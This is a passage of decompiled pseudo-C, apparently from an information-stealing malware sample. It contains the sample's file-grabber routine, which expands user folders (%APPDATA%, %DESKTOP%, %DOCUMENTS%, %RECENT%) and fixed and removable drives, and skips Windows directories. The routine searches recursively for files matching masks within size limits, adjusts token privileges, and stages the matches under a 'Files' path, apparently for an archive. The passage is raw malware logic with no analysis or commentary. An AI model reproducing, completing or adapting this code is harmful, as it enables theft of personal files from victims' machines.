  undefined local_424 [520];
  undefined local_21c [264];
  undefined local_114 [268];
  uint local_8;
  
  local_8 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  uVar3 = 0;
  local_568 = (code **)0x0;
  *unaff_EBX = 0;
  uVar2 = (*_DAT_003d93d8)(&DAT_003c6218,0,1,&DAT_003c6208,&local_568);
  uVar1 = (undefined4)((ulonglong)uVar2 >> 0x20);
  if (-1 < (int)uVar2) {
    local_56c = (int *)0x0;
    (**(code **)*local_568)(local_568,&DAT_003c6228,&local_56c);
    (*_DAT_003d9394)(0,0);
    uVar2 = (**(code **)(*local_56c + 0x14))(local_56c,local_424,0);
    uVar1 = (undefined4)((ulonglong)uVar2 >> 0x20);
    if (-1 < (int)uVar2) {
      uVar2 = (**(code **)(*local_568 + 0x4c))(local_568,0,1);
      uVar1 = (undefined4)((ulonglong)uVar2 >> 0x20);
      if (-1 < (int)uVar2) {
        uVar2 = (**(code **)(*local_568 + 0xc))(local_568,local_114,0x104,local_564,4);
        uVar1 = (undefined4)((ulonglong)uVar2 >> 0x20);
        if (-1 < (int)uVar2) {
          uVar2 = (**(code **)(*local_568 + 0x18))(local_568,local_21c,0x104);
          uVar1 = (undefined4)((ulonglong)uVar2 >> 0x20);
          if (-1 < (int)uVar2) {
            (*_DAT_003d9498)();
            uVar1 = extraout_EDX;
          }
        }
      }
    }
  }
  terminate_if_debugger_present(local_8 ^ (uint)&stack0xfffffffc,uVar1,uVar3);
  return;
}



// WARNING: Removing unreachable block (ram,0x003902f2)

void __cdecl FUN_0038ff70(int *param_1)

{
  char *pcVar1;
  uint uVar2;
  size_t sVar3;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 uVar4;
  int **in_FS_OFFSET;
  uint in_stack_00000018;
  uint local_30;
  undefined in_stack_ffffffd4;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  puStack12 = &LAB_003c32f8;
  local_10 = *in_FS_OFFSET;
  uVar2 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  *in_FS_OFFSET = (int *)&local_10;
  local_8 = 0;
  local_30 = local_30 & 0xffffff00;
  FUN_003896c0(&local_30,&param_1,(int *)0x0,(int *)0xffffffff);
  sVar3 = _strlen("C:\\Windows\\");
  FUN_003959f0(&local_30,"C:\\Windows\\",sVar3);
  sVar3 = _strlen("C:\\\\Windows\\");
  FUN_003959f0(&local_30,"C:\\\\Windows\\",sVar3);
  sVar3 = _strlen("C:\\\\\\Windows\\");
  FUN_003959f0(&local_30,"C:\\\\\\Windows\\",sVar3);
  pcVar1 = DAT_003d91b4;
  sVar3 = _strlen(DAT_003d91b4);
  FUN_003959f0(&local_30,pcVar1,sVar3);
  pcVar1 = DAT_003d90b8;
  sVar3 = _strlen(DAT_003d90b8);
  FUN_003959f0(&local_30,pcVar1,sVar3);
  pcVar1 = DAT_003d90c4;
  sVar3 = _strlen(DAT_003d90c4);
  FUN_003959f0(&local_30,pcVar1,sVar3);
  pcVar1 = DAT_003d8d9c;
  sVar3 = _strlen(DAT_003d8d9c);
  FUN_003959f0(&local_30,pcVar1,sVar3);
  pcVar1 = DAT_003d8e54;
  sVar3 = _strlen(DAT_003d8e54);
  FUN_003959f0(&local_30,pcVar1,sVar3);
  pcVar1 = DAT_003d90d8;
  sVar3 = _strlen(DAT_003d90d8);
  FUN_003959f0(&local_30,pcVar1,sVar3);
  pcVar1 = DAT_003d8bd8;
  sVar3 = _strlen(DAT_003d8bd8);
  FUN_003959f0(&local_30,pcVar1,sVar3);
  pcVar1 = DAT_003d9018;
  sVar3 = _strlen(DAT_003d9018);
  FUN_003959f0(&local_30,pcVar1,sVar3);
  pcVar1 = DAT_003d8d58;
  sVar3 = _strlen(DAT_003d8d58);
  FUN_003959f0(&local_30,pcVar1,sVar3);
  pcVar1 = DAT_003d8f44;
  sVar3 = _strlen(DAT_003d8f44);
  FUN_003959f0(&local_30,pcVar1,sVar3);
  pcVar1 = DAT_003d8ec8;
  sVar3 = _strlen(DAT_003d8ec8);
  FUN_003959f0(&local_30,pcVar1,sVar3);
  pcVar1 = DAT_003d9270;
  sVar3 = _strlen(DAT_003d9270);
  FUN_003959f0(&local_30,pcVar1,sVar3);
  pcVar1 = DAT_003d8fec;
  sVar3 = _strlen(DAT_003d8fec);
  FUN_003959f0(&local_30,pcVar1,sVar3);
  pcVar1 = DAT_003d907c;
  sVar3 = _strlen(DAT_003d907c);
  FUN_003959f0(&local_30,pcVar1,sVar3);
  pcVar1 = DAT_003d8df0;
  sVar3 = _strlen(DAT_003d8df0);
  FUN_003959f0(&local_30,pcVar1,sVar3);
  pcVar1 = DAT_003d8ec4;
  sVar3 = _strlen(DAT_003d8ec4);
  FUN_003959f0(&local_30,pcVar1,sVar3);
  pcVar1 = DAT_003d8bd4;
  sVar3 = _strlen(DAT_003d8bd4);
  FUN_003959f0(&local_30,pcVar1,sVar3);
  pcVar1 = DAT_003d8ab0;
  sVar3 = _strlen(DAT_003d8ab0);
  FUN_003959f0(&local_30,pcVar1,sVar3);
  pcVar1 = DAT_003d8c40;
  sVar3 = _strlen(DAT_003d8c40);
  FUN_003959f0(&local_30,pcVar1,sVar3);
  pcVar1 = DAT_003d90d4;
  sVar3 = _strlen(DAT_003d90d4);
  FUN_003959f0(&local_30,pcVar1,sVar3);
  local_30 = local_30 & 0xffffff00;
  uVar4 = extraout_EDX;
  if (0xf < in_stack_00000018) {
    FUN_003aee4b(param_1);
    uVar4 = extraout_EDX_00;
  }
  *in_FS_OFFSET = local_10;
  local_30 = 0x390336;
  terminate_if_debugger_present(uVar2 ^ (uint)&stack0xfffffffc,uVar4,in_stack_ffffffd4);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __cdecl FUN_00390340(undefined4 param_1)

{
  void *_Memory;
  undefined4 uVar1;
  int iVar2;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined8 uVar3;
  undefined uVar4;
  undefined4 local_48;
  undefined4 local_44;
  undefined4 local_40;
  undefined4 local_3c;
  undefined4 local_38;
  size_t local_34;
  undefined4 local_30;
  undefined4 local_2c;
  undefined4 local_28;
  undefined4 local_24;
  undefined4 local_20;
  undefined4 local_1c;
  undefined4 local_18;
  undefined4 local_14;
  undefined4 local_10;
  uint local_c;
  
  local_c = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  uVar4 = 0;
  local_34 = 0;
  uVar3 = (*_DAT_003d9570)();
  uVar1 = (undefined4)((ulonglong)uVar3 >> 0x20);
  if ((int)uVar3 == 0) {
    uVar3 = (*_DAT_003d94e8)();
    uVar1 = (undefined4)((ulonglong)uVar3 >> 0x20);
    if (((int)uVar3 == 0x7a) &&
       (_Memory = _malloc(local_34), uVar1 = extraout_EDX, _Memory != (void *)0x0)) {
      uVar3 = (*_DAT_003d9570)();
      uVar1 = (undefined4)((ulonglong)uVar3 >> 0x20);
      if ((int)uVar3 != 0) {
        local_38 = 0;
        uVar1 = (*_DAT_003d959c)(0x2000e,&local_38);
        iVar2 = (*_DAT_003d9430)(uVar1);
        if (iVar2 != 0) {
          local_3c = 0;
          iVar2 = (*_DAT_003d949c)(local_38,2,&local_3c);
          if (iVar2 != 0) {
            local_30 = 0;
            local_2c = 0;
            local_28 = 0;
            local_24 = 0;
            local_20 = 0;
            local_44 = 0;
            local_48 = 0x14;
            local_40 = 0;
            local_1c = 0x120089;
            local_18 = 0x120116;
            local_14 = 0x1200a0;
            local_10 = 0x1f01ff;
            (*_DAT_003d9548)(&param_1,&local_1c);
            (*_DAT_003d93c0)(_Memory,local_3c,param_1,&local_1c,&local_30,&local_48,&local_44,
                             &local_40);
            (*_DAT_003d93b8)(local_3c);
          }
          (*_DAT_003d93b8)(local_38);
        }
        _free(_Memory);
        uVar1 = extraout_EDX_00;
      }
    }
  }
  terminate_if_debugger_present(local_c ^ (uint)&stack0xfffffffc,uVar1,uVar4);
  return;
}



// WARNING: Function: __alloca_probe replaced with injection: alloca_probe
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __cdecl
FUN_003904a0(undefined4 param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,int param_5
            ,uint param_6,undefined4 param_7,int param_8,int param_9,undefined4 param_10,
            uint param_11,uint param_12)

{
  int iVar1;
  int *piVar2;
  char *pcVar3;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  int **extraout_ECX_01;
  int **ppiVar4;
  int **extraout_ECX_02;
  undefined4 extraout_EDX;
  undefined4 uVar5;
  undefined4 extraout_EDX_00;
  undefined *puVar6;
  undefined8 uVar7;
  uint uVar8;
  int *piVar9;
  int **ppiVar10;
  undefined uVar11;
  undefined *puVar12;
  char *local_1fdc;
  undefined *local_1fd8;
  int local_1fd4;
  int local_1fd0;
  undefined4 local_1fcc;
  undefined4 local_1fc8;
  undefined4 local_1fc4;
  undefined4 local_1fc0;
  undefined local_1fbc [320];
  char local_1e7c [5000];
  undefined local_af4 [1264];
  int *local_604 [250];
  int *local_21c [66];
  int *local_114 [67];
  uint local_8;
  
  local_8 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  local_1fc0 = param_1;
  local_1fcc = param_2;
  local_1fc4 = param_3;
  local_1fc8 = param_4;
  (*_DAT_003d9374)();
  puVar12 = local_1fbc;
  local_1fd4 = (*_DAT_003d95e0)();
  trim_string((undefined (*) [16])local_1e7c,0,5000);
  (*_DAT_003d9520)();
  uVar11 = SUB41(puVar12,0);
  uVar5 = extraout_EDX;
  if (local_1fd4 != -1) {
    do {
      iVar1 = (*_DAT_003d9550)();
      if (((iVar1 != 0) && (iVar1 = (*_DAT_003d9550)(), iVar1 != 0)) &&
         (iVar1 = FUN_00390340(0x80000000), iVar1 != 0)) {
        (*_DAT_003d95cc)();
        (*_DAT_003d9520)();
        uVar8 = 0x3905cf;
        (*_DAT_003d9520)();
        if (param_9 == 0) {
          local_1fd8 = &stack0xffffdfe8;
          piVar9 = (int *)(uVar8 & 0xffffff00);
          piVar2 = (int *)_strlen((char *)local_21c);
          FUN_003894c0(&stack0xffffdfe8,local_21c,piVar2);
          iVar1 = FUN_0038ff70(piVar9);
          if (iVar1 != 0) goto LAB_00390a6a;
        }
        trim_string((undefined (*) [16])local_604,0,1000);
        trim_string((undefined (*) [16])local_af4,0,1000);
        iVar1 = (*_DAT_003d9550)();
        if (iVar1 == 0) {
          (*_DAT_003d9374)();
        }
        else {
          (*_DAT_003d9374)();
        }
        iVar1 = (*_DAT_003d9418)();
        if (iVar1 < 4) {
          if ((param_9 == 0) || (iVar1 = (*_DAT_003d941c)(), iVar1 == 0)) {
            iVar1 = (*_DAT_003d941c)();
            if (iVar1 != 0) {
              (*_DAT_003d95cc)();
              (*_DAT_003d9520)();
              (*_DAT_003d9520)();
              uVar7 = FUN_003a5d40();
              uVar7 = __alldiv((uint)uVar7,(uint)((ulonglong)uVar7 >> 0x20),1000,0);
              uVar11 = SUB41(puVar12,0);
              uVar5 = (undefined4)((ulonglong)uVar7 >> 0x20);
              if ((uint)uVar7 < param_6) {
                if (DAT_003d92e8 <= _DAT_003d92f4) goto LAB_00390a93;
                iVar1 = FUN_00390340(0xc0000000);
                if (iVar1 != 0) {
                  if (param_8 == 0) {
                    ppiVar10 = local_114;
                    ppiVar4 = extraout_ECX_02;
                  }
                  else {
                    ppiVar4 = local_21c;
                    ppiVar10 = ppiVar4;
                  }
                  FUN_003ae240(ppiVar4,(int)local_21c,ppiVar10);
                  _DAT_003d92f4 = _DAT_003d92f4 + (uint)uVar7;
                }
              }
            }
          }
          else {
            (*_DAT_003d9544)();
            ppiVar4 = local_604;
            FUN_0038fe40();
            (*_DAT_003d9528)();
            iVar1 = (*_DAT_003d941c)();
            if (iVar1 != 0) {
              (*_DAT_003d95cc)();
              (*_DAT_003d9520)();
              (*_DAT_003d93dc)();
              (*_DAT_003d9520)();
              uVar7 = FUN_003a5d40();
              uVar7 = __alldiv((uint)uVar7,(uint)((ulonglong)uVar7 >> 0x20),1000,0);
              uVar11 = SUB41(puVar12,0);
              uVar5 = (undefined4)((ulonglong)uVar7 >> 0x20);
              if ((uint)uVar7 < param_6) {
                if (DAT_003d92e8 <= _DAT_003d92f4) goto LAB_00390a93;
                iVar1 = FUN_00390340(0xc0000000);
                if (iVar1 != 0) {
                  ppiVar10 = ppiVar4;
                  if (param_8 == 0) {
                    ppiVar4 = extraout_ECX_01;
                    ppiVar10 = local_114;
                  }
                  FUN_003ae240(ppiVar4,(int)local_604,ppiVar10);
                  _DAT_003d92f4 = _DAT_003d92f4 + (uint)uVar7;
                }
              }
            }
          }
        }
        else {
          pcVar3 = _strtok_s(local_1e7c,":",&local_1fdc);
          local_1fd0 = 0;
          puVar6 = (undefined *)0x0;
          if ((param_9 != 0) && (iVar1 = (*_DAT_003d941c)(), iVar1 != 0)) {
            local_1fd8 = (undefined *)0x1;
            (*_DAT_003d9544)();
            FUN_0038fe40();
            (*_DAT_003d9528)();
            puVar6 = local_1fd8;
          }
          if (pcVar3 != (char *)0x0) {
            do {
              iVar1 = (*_DAT_003d9490)();
              if (iVar1 != 0) {
                local_1fd0 = 1;
              }
              pcVar3 = _strtok_s((char *)0x0,":",&local_1fdc);
            } while (pcVar3 != (char *)0x0);
            if (local_1fd0 != 0) goto LAB_00390a14;
          }
          if (puVar6 == (undefined *)0x0) {
            iVar1 = (*_DAT_003d941c)();
            if (iVar1 != 0) {
              (*_DAT_003d95cc)();
              (*_DAT_003d9520)();
              (*_DAT_003d9520)();
              uVar7 = FUN_003a5d40();
              uVar7 = __alldiv((uint)uVar7,(uint)((ulonglong)uVar7 >> 0x20),1000,0);
              uVar11 = SUB41(puVar12,0);
              uVar5 = (undefined4)((ulonglong)uVar7 >> 0x20);
              uVar8 = (uint)uVar7;
              if (uVar8 < param_6) {
                if (DAT_003d92e8 <= _DAT_003d92f4) goto LAB_00390a93;
                iVar1 = FUN_00390340(0xc0000000);
                if (iVar1 != 0) {
                  ppiVar4 = local_21c;
                  uVar5 = extraout_ECX_00;
                  goto joined_r0x003908e1;
                }
              }
            }
          }
          else {
            iVar1 = (*_DAT_003d941c)();
            if (iVar1 != 0) {
              (*_DAT_003d95cc)();
              (*_DAT_003d9520)();
              (*_DAT_003d93dc)();
              (*_DAT_003d9520)();
              uVar7 = FUN_003a5d40();
              uVar7 = __alldiv((uint)uVar7,(uint)((ulonglong)uVar7 >> 0x20),1000,0);
              uVar11 = SUB41(puVar12,0);
              uVar5 = (undefined4)((ulonglong)uVar7 >> 0x20);
              uVar8 = (uint)uVar7;
              if (uVar8 < param_6) {
                if (DAT_003d92e8 <= _DAT_003d92f4) goto LAB_00390a93;
                iVar1 = FUN_00390340(0xc0000000);
                if (iVar1 != 0) {
                  ppiVar4 = local_604;
                  uVar5 = extraout_ECX;
joined_r0x003908e1:
                  ppiVar10 = ppiVar4;
                  if (param_8 == 0) {
                    ppiVar10 = local_114;
                  }
                  FUN_003ae240(uVar5,(int)ppiVar4,ppiVar10);
                  _DAT_003d92f4 = _DAT_003d92f4 + uVar8;
                }
              }
            }
          }
        }
LAB_00390a14:
        uVar11 = SUB41(puVar12,0);
        if (param_5 != 0) {
          if (param_11 < param_12) break;
          FUN_003904a0(local_1fc0,local_af4,local_21c,local_1fc8,param_5,param_6,param_7,param_8,
                       param_9,param_10,param_11,param_12 + 1);
        }
      }
LAB_00390a6a:
      iVar1 = (*_DAT_003d9438)();
      uVar11 = SUB41(puVar12,0);
    } while (iVar1 != 0);
    (*_DAT_003d93a8)();
    uVar5 = extraout_EDX_00;
  }
LAB_00390a93:
  terminate_if_debugger_present(local_8 ^ (uint)&stack0xfffffffc,uVar5,uVar11);
  return;
}



void __thiscall
FUN_00390b80(void *this,undefined4 param_1,undefined4 param_2,int param_3,uint param_4,
            undefined4 param_5)

{
  char *pcVar1;
  int unaff_EBX;
  uint unaff_ESI;
  int unaff_EDI;
  char *local_8;
  
  local_8 = (char *)this;
  pcVar1 = _strtok_s((char *)this,":",&local_8);
  while (pcVar1 != (char *)0x0) {
    FUN_003904a0(param_2,&DAT_003ce656,param_1,pcVar1,param_3,param_4,param_5,unaff_EBX,unaff_EDI,0,
                 unaff_ESI,0);
    pcVar1 = _strtok_s((char *)0x0,":",&local_8);
  }
  return;
}



// WARNING: Function: __alloca_probe replaced with injection: alloca_probe
// WARNING: Removing unreachable block (ram,0x003915f2)
// WARNING: Could not reconcile some variable overlaps
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __fastcall
FUN_00390be0(void *param_1,undefined4 param_2,undefined4 param_3,uint param_4,char *param_5,
            int param_6,int *param_7)

{
  char *pcVar1;
  uint uVar2;
  int iVar3;
  int iVar4;
  int *piVar5;
  undefined *puVar6;
  undefined4 *puVar7;
  size_t sVar8;
  undefined1 *puVar9;
  uint extraout_ECX;
  uint extraout_ECX_00;
  uint extraout_ECX_01;
  uint extraout_ECX_02;
  uint extraout_ECX_03;
  int *piVar10;
  undefined4 extraout_EDX;
  undefined4 uVar11;
  int iVar12;
  int *piVar13;
  int **in_FS_OFFSET;
  undefined8 uVar14;
  char *pcVar15;
  undefined uVar16;
  char *pcVar17;
  uint local_1574;
  int *local_1570;
  int *local_156c;
  int local_1568;
  char *local_1564;
  void *local_1560 [4];
  undefined4 local_1550;
  uint local_154c;
  void *local_1544 [4];
  undefined4 local_1534;
  uint local_1530;
  void *local_1528 [4];
  undefined4 local_1518;
  uint local_1514;
  undefined local_150c [1000];
  undefined local_1124 [1000];
  int *local_d3c [66];
  undefined local_c34 [1000];
  undefined local_84c [1000];
  char local_464 [104];
  undefined local_3fc [1000];
  uint local_14;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack12 = &LAB_003c5151;
  local_10 = *in_FS_OFFSET;
  uVar2 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  *in_FS_OFFSET = (int *)&local_10;
  local_1564 = param_5;
  local_1570 = param_7;
  local_14 = uVar2;
  trim_string((undefined (*) [16])local_1124,0,1000);
  trim_string((undefined (*) [16])local_3fc,0,1000);
  trim_string((undefined (*) [16])local_c34,0,1000);
  (*_DAT_003d9520)(local_1124,"\\Files\\",uVar2);
  (*_DAT_003d9520)(local_1124,param_3);
  (*_DAT_003d9520)(local_1124,&DAT_003d0b04);
  local_156c = FUN_003ae130();
  local_1568 = 0;
  trim_string((undefined (*) [16])local_84c,0,1000);
  iVar3 = (*_DAT_003d9500)(0,0x1a,0,0,local_84c);
  pcVar17 = local_1564;
  iVar4 = (*_DAT_003d93a0)(local_1564,"%APPDATA%");
  if (iVar4 != 0) {
    iVar12 = iVar4 - (int)local_1564;
    (*_DAT_003d9498)(&DAT_003d9830,local_1564,iVar12);
    (&DAT_003d9830)[iVar12] = 0;
    sVar8 = _strlen("%APPDATA%");
    (*_DAT_003d9374)(&DAT_003d9830 + iVar12,&DAT_003d0954,(iVar3 < 0) - 1 & (uint)local_84c,
                     sVar8 + iVar4);
    pcVar17 = &DAT_003d9830;
  }
  (*_DAT_003d95cc)(local_3fc,pcVar17);
  trim_string((undefined (*) [16])local_84c,0,1000);
  iVar3 = (*_DAT_003d9500)(0,0x1c,0,0,local_84c);
  iVar4 = (*_DAT_003d93a0)(local_3fc,"%LOCALAPPDATA%");
  if (iVar4 == 0) {
    puVar9 = local_3fc;
  }
  else {
    iVar12 = iVar4 - (int)local_3fc;
    (*_DAT_003d9498)(&DAT_003d9830,local_3fc,iVar12);
    (&DAT_003d9830)[iVar12] = 0;
    sVar8 = _strlen("%LOCALAPPDATA%");
    (*_DAT_003d9374)(&DAT_003d9830 + iVar12,&DAT_003d0954,(iVar3 < 0) - 1 & (uint)local_84c,
                     sVar8 + iVar4);
    puVar9 = &DAT_003d9830;
  }
  (*_DAT_003d95cc)(local_3fc,puVar9);
  trim_string((undefined (*) [16])local_84c,0,1000);
  iVar3 = (*_DAT_003d9500)(0,0x28,0,0,local_84c);
  iVar4 = (*_DAT_003d93a0)(local_3fc,"%USERPROFILE%");
  if (iVar4 == 0) {
    puVar9 = local_3fc;
  }
  else {
    iVar12 = iVar4 - (int)local_3fc;
    (*_DAT_003d9498)(&DAT_003d9830,local_3fc,iVar12);
    (&DAT_003d9830)[iVar12] = 0;
    sVar8 = _strlen("%USERPROFILE%");
    (*_DAT_003d9374)(&DAT_003d9830 + iVar12,&DAT_003d0954,(iVar3 < 0) - 1 & (uint)local_84c,
                     sVar8 + iVar4);
    puVar9 = &DAT_003d9830;
  }
  (*_DAT_003d95cc)(local_3fc,puVar9);
  local_1574 = 0x101;
  (*_DAT_003d944c)(local_d3c,&local_1574);
  local_1514 = 0xf;
  local_1518 = 0;
  local_1528[0] = (void *)((uint)local_1528[0] & 0xffffff00);
  piVar5 = (int *)_strlen((char *)local_d3c);
  FUN_003894c0(local_1528,local_d3c,piVar5);
  local_8 = 0;
  puVar6 = FUN_00389b30(local_1560,local_1528);
  local_8._0_1_ = 1;
  puVar7 = (undefined4 *)FUN_00395bc0(local_1544,puVar6);
  local_8 = CONCAT31(local_8._1_3_,2);
  if (0xf < (uint)puVar7[5]) {
    puVar7 = (undefined4 *)*puVar7;
  }
  iVar3 = (*_DAT_003d93a0)(local_3fc,"%DESKTOP%");
  if (iVar3 == 0) {
    puVar9 = local_3fc;
  }
  else {
    iVar4 = iVar3 - (int)local_3fc;
    (*_DAT_003d9498)(&DAT_003d9830,local_3fc,iVar4);
    (&DAT_003d9830)[iVar4] = 0;
    sVar8 = _strlen("%DESKTOP%");
    (*_DAT_003d9374)(&DAT_003d9830 + iVar4,&DAT_003d0954,puVar7,sVar8 + iVar3);
    puVar9 = &DAT_003d9830;
  }
  (*_DAT_003d95cc)(local_3fc,puVar9);
  if (0xf < local_1530) {
    FUN_003aee4b(local_1544[0]);
  }
  local_1530 = 0xf;
  local_1534 = 0;
  local_1544[0] = (void *)((uint)local_1544[0] & 0xffffff00);
  if (0xf < local_154c) {
    FUN_003aee4b(local_1560[0]);
  }
  local_8 = 0xffffffff;
  local_154c = 0xf;
  local_1550 = 0;
  local_1560[0] = (void *)((uint)local_1560[0] & 0xffffff00);
  if (0xf < local_1514) {
    FUN_003aee4b(local_1528[0]);
  }
  trim_string((undefined (*) [16])local_84c,0,1000);
  iVar3 = (*_DAT_003d9500)(0,5,0,0,local_84c);
  iVar4 = (*_DAT_003d93a0)(local_3fc,"%DOCUMENTS%");
  if (iVar4 == 0) {
    puVar9 = local_3fc;
  }
  else {
    iVar12 = iVar4 - (int)local_3fc;
    (*_DAT_003d9498)(&DAT_003d9830,local_3fc,iVar12);
    (&DAT_003d9830)[iVar12] = 0;
    sVar8 = _strlen("%DOCUMENTS%");
    (*_DAT_003d9374)(&DAT_003d9830 + iVar12,&DAT_003d0954,(iVar3 < 0) - 1 & (uint)local_84c,
                     sVar8 + iVar4);
    puVar9 = &DAT_003d9830;
  }
  (*_DAT_003d95cc)(local_3fc,puVar9);
  trim_string((undefined (*) [16])local_84c,0,1000);
  iVar3 = (*_DAT_003d9500)(0,0x26,0,0,local_84c);
  iVar4 = (*_DAT_003d93a0)(local_3fc,"%PROGRAMFILES%");
  if (iVar4 == 0) {
    puVar9 = local_3fc;
  }
  else {
    iVar12 = iVar4 - (int)local_3fc;
    (*_DAT_003d9498)(&DAT_003d9830,local_3fc,iVar12);
    (&DAT_003d9830)[iVar12] = 0;
    sVar8 = _strlen("%PROGRAMFILES%");
    (*_DAT_003d9374)(&DAT_003d9830 + iVar12,&DAT_003d0954,(iVar3 < 0) - 1 & (uint)local_84c,
                     sVar8 + iVar4);
    puVar9 = &DAT_003d9830;
  }
  (*_DAT_003d95cc)(local_3fc,puVar9);
  trim_string((undefined (*) [16])local_84c,0,1000);
  iVar3 = (*_DAT_003d9500)(0,0x2a,0,0,local_84c);
  iVar4 = (*_DAT_003d93a0)(local_3fc,"%PROGRAMFILES_86%");
  if (iVar4 == 0) {
    puVar9 = local_3fc;
  }
  else {
    iVar12 = iVar4 - (int)local_3fc;
    (*_DAT_003d9498)(&DAT_003d9830,local_3fc,iVar12);
    (&DAT_003d9830)[iVar12] = 0;
    sVar8 = _strlen("%PROGRAMFILES_86%");
    (*_DAT_003d9374)(&DAT_003d9830 + iVar12,&DAT_003d0954,(iVar3 < 0) - 1 & (uint)local_84c,
                     sVar8 + iVar4);
    puVar9 = &DAT_003d9830;
  }
  (*_DAT_003d95cc)(local_3fc,puVar9);
  trim_string((undefined (*) [16])local_150c,0,1000);
  iVar3 = (*_DAT_003d9500)(0,8,0,0,local_150c);
  iVar4 = (*_DAT_003d93a0)(local_3fc,"%RECENT%");
  if (iVar4 == 0) {
    puVar9 = local_3fc;
  }
  else {
    iVar12 = iVar4 - (int)local_3fc;
    (*_DAT_003d9498)(&DAT_003d9830,local_3fc,iVar12);
    (&DAT_003d9830)[iVar12] = 0;
    sVar8 = _strlen("%RECENT%");
    (*_DAT_003d9374)(&DAT_003d9830 + iVar12,&DAT_003d0954,(iVar3 < 0) - 1 & (uint)local_150c,
                     sVar8 + iVar4);
    puVar9 = &DAT_003d9830;
  }
  (*_DAT_003d95cc)(local_3fc,puVar9);
  iVar3 = (*_DAT_003d9490)(local_3fc,"*%DRIVE_FIXED%*",0);
  if (iVar3 != 0) {
    local_1568 = 1;
  }
  pcVar17 = "*%DRIVE_REMOVABLE%*";
  iVar3 = (*_DAT_003d9490)(local_3fc,"*%DRIVE_REMOVABLE%*",0);
  if (iVar3 != 0) {
    local_1568 = 1;
  }
  iVar4 = (*_DAT_003d9490)(local_1564,"*%RECENT%*",0);
  uVar16 = SUB41(pcVar17,0);
  local_1574 = (uint)(iVar4 != 0);
  if (local_1568 == 0) {
    FUN_00390b80(param_1,local_3fc,local_156c,param_6,param_4,param_2);
    uVar2 = extraout_ECX_01;
  }
  else {
    (*_DAT_003d94b4)(100,local_464);
    uVar16 = SUB41(pcVar17,0);
    pcVar1 = local_464;
    uVar2 = extraout_ECX;
    while (local_1564 = pcVar1, local_464[0] != '\0') {
      iVar4 = (*_DAT_003d93f8)(pcVar1);
      if ((iVar3 != 0) && (iVar4 == 2)) {
        (*_DAT_003d95cc)(local_c34,local_3fc);
        iVar4 = (*_DAT_003d93a0)(local_c34,"%DRIVE_REMOVABLE%");
        puVar9 = local_c34;
        if (iVar4 != 0) {
          iVar12 = iVar4 - (int)puVar9;
          (*_DAT_003d9498)(&DAT_003d9830,puVar9,iVar12);
          pcVar15 = "%DRIVE_REMOVABLE%";
LAB_00391475:
          (&DAT_003d9830)[iVar12] = 0;
          sVar8 = _strlen(pcVar15);
          (*_DAT_003d9374)(&DAT_003d9830 + iVar12,&DAT_003d0954,pcVar1,sVar8 + iVar4);
          puVar9 = &DAT_003d9830;
        }
      }
      else {
        (*_DAT_003d95cc)(local_c34,local_3fc);
        iVar4 = (*_DAT_003d93a0)(local_c34,"%DRIVE_FIXED%");
        puVar9 = local_c34;
        if (iVar4 != 0) {
          iVar12 = iVar4 - (int)puVar9;
          (*_DAT_003d9498)(&DAT_003d9830,puVar9,iVar12);
          pcVar15 = "%DRIVE_FIXED%";
          goto LAB_00391475;
        }
      }
      (*_DAT_003d95cc)(local_c34,puVar9);
      FUN_00390b80(param_1,local_c34,local_156c,param_6,param_4,param_2);
      pcVar15 = local_1564;
      iVar4 = (*_DAT_003d9418)(local_1564);
      uVar16 = SUB41(pcVar17,0);
      pcVar1 = pcVar15 + iVar4 + 1;
      uVar2 = extraout_ECX_00;
      local_464[0] = pcVar15[iVar4 + 1];
    }
  }
  piVar5 = local_156c;
  if (local_156c == (int *)0x0) {
    _DAT_003d9814 = 0x10000;
    piVar10 = (int *)0x0;
    piVar13 = (int *)0x0;
  }
  else {
    if (*local_156c == 2) {
      iVar3 = local_156c[1];
      if (*(char *)(iVar3 + 0x2c) == '\0') {
        FUN_003ae070(uVar2);
        uVar2 = extraout_ECX_02;
      }
      piVar10 = *(int **)(iVar3 + 0x20);
      _DAT_003d9814 = (-(uint)(piVar10 != (int *)0x0) & 0xfffe0000) + 0x20000;
      *(undefined *)(iVar3 + 0x2c) = 1;
      piVar13 = *(int **)(iVar3 + 0x18);
    }
    else {
      _DAT_003d9814 = 0x80000;
      piVar10 = local_1570;
      piVar13 = local_1570;
    }
  }
  if (local_1570 == (int *)0x0) {
    uVar14 = CONCAT44(piVar10,0x10000);
  }
  else {
    if (*local_1570 == 2) {
      uVar14 = FUN_003ad750((char **)local_1570[1],(int)piVar10,local_1124,(int)piVar13,3);
      uVar2 = extraout_ECX_03;
    }
    else {
      uVar14 = CONCAT44(piVar10,0x80000);
    }
  }
  uVar11 = (undefined4)((ulonglong)uVar14 >> 0x20);
  _DAT_003d9814 = (int)uVar14;
  if (piVar5 == (int *)0x0) {
    _DAT_003d9814 = 0x10000;
  }
  else {
    iVar3 = *piVar5;
    if (iVar3 == 1) {
      iVar3 = piVar5[1];
      _DAT_003d96b0 = FUN_0038e580();
      if (iVar3 != 0) {
        FUN_0038e6e0();
      }
    }
    else {
      if (iVar3 != 2) {
        _DAT_003d9814 = 0x80000;
        goto LAB_0039164e;
      }
      iVar4 = piVar5[1];
      _DAT_003d9814 = FUN_003ad040(uVar2 & 0xffffff00 | (uint)(iVar3 == 1));
      if (iVar4 != 0) {
        FUN_003ae1f0();
      }
    }
    FUN_003aee4b(piVar5);
    uVar11 = extraout_EDX;
  }
LAB_0039164e:
  *in_FS_OFFSET = local_10;
  terminate_if_debugger_present(local_14 ^ (uint)&stack0xfffffffc,uVar11,uVar16);
  return;
}



// WARNING: Function: __alloca_probe replaced with injection: alloca_probe
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00391670(void)

{
  undefined4 uVar1;
  int *piVar2;
  char *pcVar3;
  int iVar4;
  undefined4 extraout_EDX;
